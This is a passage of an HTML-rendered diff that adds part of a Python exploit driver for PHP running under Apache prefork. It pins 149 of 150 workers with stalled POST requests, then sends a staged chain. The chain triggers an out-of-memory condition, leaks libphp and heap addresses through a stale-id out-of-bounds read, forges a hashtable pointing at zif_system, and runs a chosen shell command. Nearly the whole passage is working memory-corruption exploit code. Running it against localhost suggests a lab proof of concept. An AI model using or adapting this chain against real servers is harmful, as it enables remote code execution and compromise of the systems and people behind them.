+</span></span><span class=line><span class=cl>        <span class=s2>&#34;lib&#34;</span><span class=p>:</span> <span class=n>lib</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;buckets&#34;</span><span class=p>:</span> <span class=n>buckets</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;main_candidates&#34;</span><span class=p>:</span> <span class=p>[</span><span class=n>b</span> <span class=k>for</span> <span class=n>b</span><span class=p>,</span> <span class=n>c</span> <span class=ow>in</span> <span class=n>cands</span><span class=p>[:</span><span class=mi>3</span><span class=p>]],</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;cand_counts&#34;</span><span class=p>:</span> <span class=p>{</span><span class=n>b</span><span class=p>:</span> <span class=n>c</span> <span class=k>for</span> <span class=n>b</span><span class=p>,</span> <span class=n>c</span> <span class=ow>in</span> <span class=n>cands</span><span class=p>[:</span><span class=mi>3</span><span class=p>]},</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>hold_workers</span><span class=p>(</span><span class=n>port</span><span class=p>:</span> <span class=nb>int</span><span class=p>,</span> <span class=n>workers</span><span class=p>:</span> <span class=nb>int</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;Occupy all but one prefork child with incomplete POST bodies.
+</span></span></span><span class=line><span class=cl><span class=s2>
+</span></span></span><span class=line><span class=cl><span class=s2>    The official image ships MaxRequestWorkers=150.  Holding 149 children
+</span></span></span><span class=line><span class=cl><span class=s2>    makes every later request land on the same remaining child, which is
+</span></span></span><span class=line><span class=cl><span class=s2>    what the cross-request dangling pointers require.
+</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>holders</span> <span class=o>=</span> <span class=p>[]</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>workers</span> <span class=o>&lt;=</span> <span class=mi>1</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>holders</span>
+</span></span><span class=line><span class=cl>    <span class=n>n</span> <span class=o>=</span> <span class=n>workers</span> <span class=o>-</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>n</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>s</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>create_connection</span><span class=p>((</span><span class=s2>&#34;127.0.0.1&#34;</span><span class=p>,</span> <span class=n>port</span><span class=p>),</span> <span class=n>timeout</span><span class=o>=</span><span class=mi>5</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=n>s</span><span class=o>.</span><span class=n>sendall</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;POST /index.php HTTP/1.1</span><span class=se>\r\n</span><span class=s2>Host: 127.0.0.1</span><span class=se>\r\n</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl>                      <span class=sa>b</span><span class=s2>&#34;Content-Type: application/x-www-form-urlencoded</span><span class=se>\r\n</span><span class=s2>&#34;</span>
+</span></span><span class=line><span class=cl>                      <span class=sa>b</span><span class=s2>&#34;Content-Length: 1048576</span><span class=se>\r\n\r\n</span><span class=s2>x&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=n>holders</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>s</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>OSError</span> <span class=k>as</span> <span class=n>exc</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;      holder </span><span class=si>%d</span><span class=s2>/</span><span class=si>%d</span><span class=s2> failed: </span><span class=si>%r</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>i</span> <span class=o>+</span> <span class=mi>1</span><span class=p>,</span> <span class=n>n</span><span class=p>,</span> <span class=n>exc</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>            <span class=k>break</span>
+</span></span><span class=line><span class=cl>        <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mf>0.01</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mf>0.8</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;      pinned </span><span class=si>%d</span><span class=s2>/</span><span class=si>%d</span><span class=s2> workers (</span><span class=si>%d</span><span class=s2> holders)&#34;</span> <span class=o>%</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl>        <span class=nb>len</span><span class=p>(</span><span class=n>holders</span><span class=p>)</span> <span class=o>+</span> <span class=mi>1</span><span class=p>,</span> <span class=n>workers</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>holders</span><span class=p>)))</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>holders</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>()</span> <span class=o>-&gt;</span> <span class=nb>int</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>ap</span> <span class=o>=</span> <span class=n>argparse</span><span class=o>.</span><span class=n>ArgumentParser</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>ap</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s2>&#34;--port&#34;</span><span class=p>,</span> <span class=nb>type</span><span class=o>=</span><span class=nb>int</span><span class=p>,</span> <span class=n>default</span><span class=o>=</span><span class=mi>18110</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>ap</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s2>&#34;--arch&#34;</span><span class=p>,</span> <span class=n>choices</span><span class=o>=</span><span class=p>(</span><span class=s2>&#34;auto&#34;</span><span class=p>,)</span> <span class=o>+</span> <span class=nb>tuple</span><span class=p>(</span><span class=n>PROFILES</span><span class=p>),</span>
+</span></span><span class=line><span class=cl>                    <span class=n>default</span><span class=o>=</span><span class=s2>&#34;auto&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                    <span class=n>help</span><span class=o>=</span><span class=s2>&#34;target architecture (default: auto from the leak)&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>ap</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s2>&#34;--restart&#34;</span><span class=p>,</span> <span class=n>default</span><span class=o>=</span><span class=s2>&#34;&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                    <span class=n>help</span><span class=o>=</span><span class=s2>&#34;docker container name to restart before the chain&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>ap</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s2>&#34;--docker&#34;</span><span class=p>,</span> <span class=n>default</span><span class=o>=</span><span class=s2>&#34;sudo docker&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>ap</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s2>&#34;--cmd&#34;</span><span class=p>,</span> <span class=n>default</span><span class=o>=</span><span class=s2>&#34;id&gt;/out/p1&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>ap</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s2>&#34;--proof&#34;</span><span class=p>,</span> <span class=n>default</span><span class=o>=</span><span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>R</span><span class=p>,</span> <span class=s2>&#34;out&#34;</span><span class=p>,</span> <span class=s2>&#34;p1&#34;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>ap</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s2>&#34;--outdir&#34;</span><span class=p>,</span> <span class=n>default</span><span class=o>=</span><span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>R</span><span class=p>,</span> <span class=s2>&#34;out&#34;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>ap</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s2>&#34;--timeout&#34;</span><span class=p>,</span> <span class=nb>type</span><span class=o>=</span><span class=nb>float</span><span class=p>,</span> <span class=n>default</span><span class=o>=</span><span class=mf>600.0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>ap</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s2>&#34;--retries&#34;</span><span class=p>,</span> <span class=nb>type</span><span class=o>=</span><span class=nb>int</span><span class=p>,</span> <span class=n>default</span><span class=o>=</span><span class=mi>3</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>ap</span><span class=o>.</span><span class=n>add_argument</span><span class=p>(</span><span class=s2>&#34;--workers&#34;</span><span class=p>,</span> <span class=nb>type</span><span class=o>=</span><span class=nb>int</span><span class=p>,</span> <span class=n>default</span><span class=o>=</span><span class=mi>150</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                    <span class=n>help</span><span class=o>=</span><span class=s2>&#34;prefork MaxRequestWorkers (1 = no pinning)&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>args</span> <span class=o>=</span> <span class=n>ap</span><span class=o>.</span><span class=n>parse_args</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>profile</span> <span class=o>=</span> <span class=kc>None</span> <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>arch</span> <span class=o>==</span> <span class=s2>&#34;auto&#34;</span> <span class=k>else</span> <span class=n>PROFILES</span><span class=p>[</span><span class=n>args</span><span class=o>.</span><span class=n>arch</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>os</span><span class=o>.</span><span class=n>makedirs</span><span class=p>(</span><span class=n>args</span><span class=o>.</span><span class=n>outdir</span><span class=p>,</span> <span class=n>exist_ok</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>exists</span><span class=p>(</span><span class=n>args</span><span class=o>.</span><span class=n>proof</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>os</span><span class=o>.</span><span class=n>remove</span><span class=p>(</span><span class=n>args</span><span class=o>.</span><span class=n>proof</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>PermissionError</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>subprocess</span><span class=o>.</span><span class=n>run</span><span class=p>([</span><span class=s2>&#34;sudo&#34;</span><span class=p>,</span> <span class=s2>&#34;rm&#34;</span><span class=p>,</span> <span class=s2>&#34;-f&#34;</span><span class=p>,</span> <span class=n>args</span><span class=o>.</span><span class=n>proof</span><span class=p>],</span> <span class=n>check</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>restart</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>subprocess</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>args</span><span class=o>.</span><span class=n>docker</span><span class=o>.</span><span class=n>split</span><span class=p>()</span> <span class=o>+</span> <span class=p>[</span><span class=s2>&#34;restart&#34;</span><span class=p>,</span> <span class=n>args</span><span class=o>.</span><span class=n>restart</span><span class=p>],</span>
+</span></span><span class=line><span class=cl>                       <span class=n>check</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span> <span class=n>stdout</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>DEVNULL</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mf>1.2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=n>holders</span> <span class=o>=</span> <span class=n>hold_workers</span><span class=p>(</span><span class=n>args</span><span class=o>.</span><span class=n>port</span><span class=p>,</span> <span class=n>args</span><span class=o>.</span><span class=n>workers</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>run_chain</span><span class=p>(</span><span class=n>args</span><span class=p>,</span> <span class=n>holders</span><span class=p>,</span> <span class=n>profile</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>finally</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>s</span> <span class=ow>in</span> <span class=n>holders</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=n>s</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>            <span class=k>except</span> <span class=ne>OSError</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=k>pass</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>run_chain</span><span class=p>(</span><span class=n>args</span><span class=p>,</span> <span class=n>holders</span><span class=p>,</span> <span class=n>profile</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>int</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>attempt</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>args</span><span class=o>.</span><span class=n>retries</span> <span class=o>+</span> <span class=mi>1</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=n>tmp</span> <span class=o>=</span> <span class=n>tempfile</span><span class=o>.</span><span class=n>mkdtemp</span><span class=p>(</span><span class=n>prefix</span><span class=o>=</span><span class=s2>&#34;p2s-pure-&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>s</span> <span class=o>=</span> <span class=n>socket</span><span class=o>.</span><span class=n>create_connection</span><span class=p>((</span><span class=s2>&#34;127.0.0.1&#34;</span><span class=p>,</span> <span class=n>args</span><span class=o>.</span><span class=n>port</span><span class=p>),</span> <span class=n>timeout</span><span class=o>=</span><span class=mi>5</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=n>s</span><span class=o>.</span><span class=n>sendall</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;GET /index.php HTTP/1.0</span><span class=se>\r\n</span><span class=s2>Host: x</span><span class=se>\r\n\r\n</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=n>s</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mi>1024</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=n>s</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>OSError</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>pass</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[try </span><span class=si>%d</span><span class=s2>] A1: END-cleanup send_cookie OOM&#34;</span> <span class=o>%</span> <span class=n>attempt</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>a1</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>tmp</span><span class=p>,</span> <span class=s2>&#34;a.bin&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>subprocess</span><span class=o>.</span><span class=n>run</span><span class=p>([</span><span class=n>sys</span><span class=o>.</span><span class=n>executable</span><span class=p>,</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>PURE</span><span class=p>,</span> <span class=s2>&#34;mk_a1.py&#34;</span><span class=p>),</span>
+</span></span><span class=line><span class=cl>                        <span class=s2>&#34;--out&#34;</span><span class=p>,</span> <span class=n>a1</span><span class=p>,</span> <span class=s2>&#34;--big&#34;</span><span class=p>,</span> <span class=s2>&#34;78&#34;</span><span class=p>],</span> <span class=n>check</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                       <span class=n>stdout</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>DEVNULL</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>send_chunked</span><span class=p>(</span><span class=n>args</span><span class=o>.</span><span class=n>port</span><span class=p>,</span> <span class=s2>&#34;/index.php&#34;</span> <span class=o>+</span> <span class=n>Q</span><span class=p>,</span> <span class=n>a1</span><span class=p>,</span> <span class=mi>180</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mf>0.2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[try </span><span class=si>%d</span><span class=s2>] B1: stale-id OOB read (chunk base + libphp)&#34;</span> <span class=o>%</span> <span class=n>attempt</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>b1</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>tmp</span><span class=p>,</span> <span class=s2>&#34;b1.bin&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>subprocess</span><span class=o>.</span><span class=n>run</span><span class=p>([</span><span class=n>sys</span><span class=o>.</span><span class=n>executable</span><span class=p>,</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>PURE</span><span class=p>,</span> <span class=s2>&#34;mk_leak_b.py&#34;</span><span class=p>),</span>
+</span></span><span class=line><span class=cl>                        <span class=s2>&#34;--out&#34;</span><span class=p>,</span> <span class=n>b1</span><span class=p>,</span> <span class=s2>&#34;--spec&#34;</span><span class=p>,</span> <span class=n>LEAK_SPEC</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                        <span class=s2>&#34;--fake-len&#34;</span><span class=p>,</span> <span class=s2>&#34;0xC8000&#34;</span><span class=p>,</span> <span class=s2>&#34;--tag&#34;</span><span class=p>],</span> <span class=n>check</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                       <span class=n>stdout</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>DEVNULL</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>leak_file</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>tmp</span><span class=p>,</span> <span class=s2>&#34;leak.resp&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>resp</span> <span class=o>=</span> <span class=n>send_chunked</span><span class=p>(</span><span class=n>args</span><span class=o>.</span><span class=n>port</span><span class=p>,</span> <span class=s2>&#34;/index.php&#34;</span><span class=p>,</span> <span class=n>b1</span><span class=p>,</span> <span class=n>args</span><span class=o>.</span><span class=n>timeout</span><span class=p>,</span> <span class=n>leak_file</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=n>info</span> <span class=o>=</span> <span class=n>parse_leak</span><span class=p>(</span><span class=n>resp</span><span class=p>,</span> <span class=n>profile</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>exc</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;      leak failed: </span><span class=si>%r</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span><span class=n>exc</span><span class=p>,))</span>
+</span></span><span class=line><span class=cl>            <span class=k>continue</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;      arch=</span><span class=si>%s</span><span class=s2> decoded=</span><span class=si>%d</span><span class=s2> zval_ptr_dtor=</span><span class=si>%#x</span><span class=s2> -&gt; libphp=</span><span class=si>%#x</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl>            <span class=n>info</span><span class=p>[</span><span class=s2>&#34;arch&#34;</span><span class=p>],</span> <span class=n>info</span><span class=p>[</span><span class=s2>&#34;decoded&#34;</span><span class=p>],</span> <span class=n>info</span><span class=p>[</span><span class=s2>&#34;zdtor&#34;</span><span class=p>],</span> <span class=n>info</span><span class=p>[</span><span class=s2>&#34;lib&#34;</span><span class=p>]))</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;      chunk buckets: </span><span class=si>%s</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>[(</span><span class=nb>hex</span><span class=p>(</span><span class=n>b</span><span class=p>),</span> <span class=n>c</span><span class=p>)</span> <span class=k>for</span> <span class=n>b</span><span class=p>,</span> <span class=n>c</span> <span class=ow>in</span>
+</span></span><span class=line><span class=cl>                                           <span class=n>info</span><span class=p>[</span><span class=s2>&#34;buckets&#34;</span><span class=p>]</span><span class=o>.</span><span class=n>most_common</span><span class=p>(</span><span class=mi>6</span><span class=p>)])</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=n>info</span><span class=p>[</span><span class=s2>&#34;main_candidates&#34;</span><span class=p>]:</span>
+</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;      no main-chunk candidate&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=k>continue</span>
+</span></span><span class=line><span class=cl>        <span class=n>main</span> <span class=o>=</span> <span class=n>info</span><span class=p>[</span><span class=s2>&#34;main_candidates&#34;</span><span class=p>][</span><span class=mi>0</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>        <span class=n>delta</span> <span class=o>=</span> <span class=n>info</span><span class=p>[</span><span class=s2>&#34;lib&#34;</span><span class=p>]</span> <span class=o>-</span> <span class=n>main</span>
+</span></span><span class=line><span class=cl>        <span class=n>prof</span> <span class=o>=</span> <span class=n>info</span><span class=p>[</span><span class=s2>&#34;profile&#34;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=p>(</span><span class=n>prof</span><span class=p>[</span><span class=s2>&#34;delta_min&#34;</span><span class=p>]</span> <span class=o>&lt;=</span> <span class=n>delta</span> <span class=o>&lt;=</span> <span class=n>prof</span><span class=p>[</span><span class=s2>&#34;delta_max&#34;</span><span class=p>]):</span>
+</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;      implausible libphp-main delta </span><span class=si>%#x</span><span class=s2>; re-leak&#34;</span> <span class=o>%</span> <span class=n>delta</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=k>continue</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=n>zif</span> <span class=o>=</span> <span class=n>info</span><span class=p>[</span><span class=s2>&#34;lib&#34;</span><span class=p>]</span> <span class=o>+</span> <span class=n>prof</span><span class=p>[</span><span class=s2>&#34;zif_offset&#34;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>cand</span> <span class=ow>in</span> <span class=n>info</span><span class=p>[</span><span class=s2>&#34;main_candidates&#34;</span><span class=p>]:</span>
+</span></span><span class=line><span class=cl>            <span class=n>S</span> <span class=o>=</span> <span class=n>cand</span> <span class=o>+</span> <span class=mh>0xF8398</span>
+</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[try </span><span class=si>%d</span><span class=s2>] A2 + B2: main=</span><span class=si>%#x</span><span class=s2> S=</span><span class=si>%#x</span><span class=s2> zif_system=</span><span class=si>%#x</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=p>(</span>
+</span></span><span class=line><span class=cl>                <span class=n>attempt</span><span class=p>,</span> <span class=n>cand</span><span class=p>,</span> <span class=n>S</span><span class=p>,</span> <span class=n>zif</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>            <span class=n>subprocess</span><span class=o>.</span><span class=n>run</span><span class=p>([</span><span class=n>sys</span><span class=o>.</span><span class=n>executable</span><span class=p>,</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>PURE</span><span class=p>,</span> <span class=s2>&#34;cheap_oom_a.py&#34;</span><span class=p>),</span>
+</span></span><span class=line><span class=cl>                            <span class=s2>&#34;--port&#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>args</span><span class=o>.</span><span class=n>port</span><span class=p>),</span> <span class=s2>&#34;--parts&#34;</span><span class=p>,</span> <span class=s2>&#34;880&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                            <span class=s2>&#34;--depth&#34;</span><span class=p>,</span> <span class=s2>&#34;64&#34;</span><span class=p>,</span> <span class=s2>&#34;--fillers&#34;</span><span class=p>,</span> <span class=s2>&#34;115&#34;</span><span class=p>],</span> <span class=n>check</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                           <span class=n>stdout</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>DEVNULL</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mf>0.2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=n>ht</span> <span class=o>=</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>tmp</span><span class=p>,</span> <span class=s2>&#34;ht.bin&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=n>subprocess</span><span class=o>.</span><span class=n>run</span><span class=p>([</span><span class=n>sys</span><span class=o>.</span><span class=n>executable</span><span class=p>,</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>PURE</span><span class=p>,</span> <span class=s2>&#34;mk_ht.py&#34;</span><span class=p>),</span>
+</span></span><span class=line><span class=cl>                            <span class=nb>hex</span><span class=p>(</span><span class=n>S</span><span class=p>),</span> <span class=nb>hex</span><span class=p>(</span><span class=n>zif</span><span class=p>),</span> <span class=n>args</span><span class=o>.</span><span class=n>cmd</span><span class=p>,</span> <span class=n>ht</span><span class=p>],</span> <span class=n>check</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                           <span class=n>stdout</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>DEVNULL</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=n>subprocess</span><span class=o>.</span><span class=n>run</span><span class=p>([</span><span class=n>sys</span><span class=o>.</span><span class=n>executable</span><span class=p>,</span> <span class=n>os</span><span class=o>.</span><span class=n>path</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>PURE</span><span class=p>,</span> <span class=s2>&#34;fake_ref_b.py&#34;</span><span class=p>),</span>
+</span></span><span class=line><span class=cl>                            <span class=s2>&#34;--port&#34;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>args</span><span class=o>.</span><span class=n>port</span><span class=p>),</span> <span class=s2>&#34;--vl&#34;</span><span class=p>,</span> <span class=s2>&#34;384&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                            <span class=s2>&#34;--n1&#34;</span><span class=p>,</span> <span class=s2>&#34;500&#34;</span><span class=p>,</span> <span class=s2>&#34;--n2&#34;</span><span class=p>,</span> <span class=s2>&#34;495&#34;</span><span class=p>,</span> <span class=s2>&#34;--rc&#34;</span><span class=p>,</span> <span class=s2>&#34;1&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                            <span class=s2>&#34;--ht-addr&#34;</span><span class=p>,</span> <span class=nb>hex</span><span class=p>(</span><span class=n>S</span><span class=p>),</span> <span class=s2>&#34;--ht-file&#34;</span><span class=p>,</span> <span class=n>ht</span><span class=p>],</span> <span class=n>check</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                           <span class=n>stdout</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>DEVNULL</span><span class=p>)</span>
